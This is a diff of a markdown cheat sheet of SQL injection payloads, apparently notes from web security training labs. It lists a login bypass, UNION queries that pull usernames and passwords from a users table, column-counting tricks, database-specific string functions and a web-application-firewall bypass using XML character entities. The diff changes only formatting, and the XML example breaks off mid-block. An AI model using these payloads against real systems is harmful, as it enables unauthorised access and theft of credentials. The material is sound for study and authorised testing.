@@ -44,22 +44,29 @@ Instead of
 ## **SQL INJECTION**
 
 Login Bypass:
+
 `administrator'--`
 
 Simple Data Retrieve (request `SELECT name, description FROM products WHERE category = 'Gifts'`):
+
 `' UNION SELECT username, password FROM users--`
 **Oracle add `from dual`**
 #Determine number of columns:
+
 `' ORDER BY 3--`
-Second method, allow to determine type of data in column
+Second method, allow to determine type of data in column:
+
 `' UNION SELECT NULL,NULL,NULL--`/`' UNION SELECT 'a',NULL,NULL,NULL--`
 #Concatenation of strings:
+
 `' UNION SELECT username || '~' || password FROM users--`
 Mysql `CONCAT('foo','bar'` or `'foo' 'bar'` note space.
 #Substring:
+
 `SUBSTRING('foobar', 4, 2)`
 Oracle `SUBSTR('foobar', 4, 2)`
 #Simle WAF Bypass by encoding:
+
 `<stockCheck>
     <productId>123</productId>
     <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
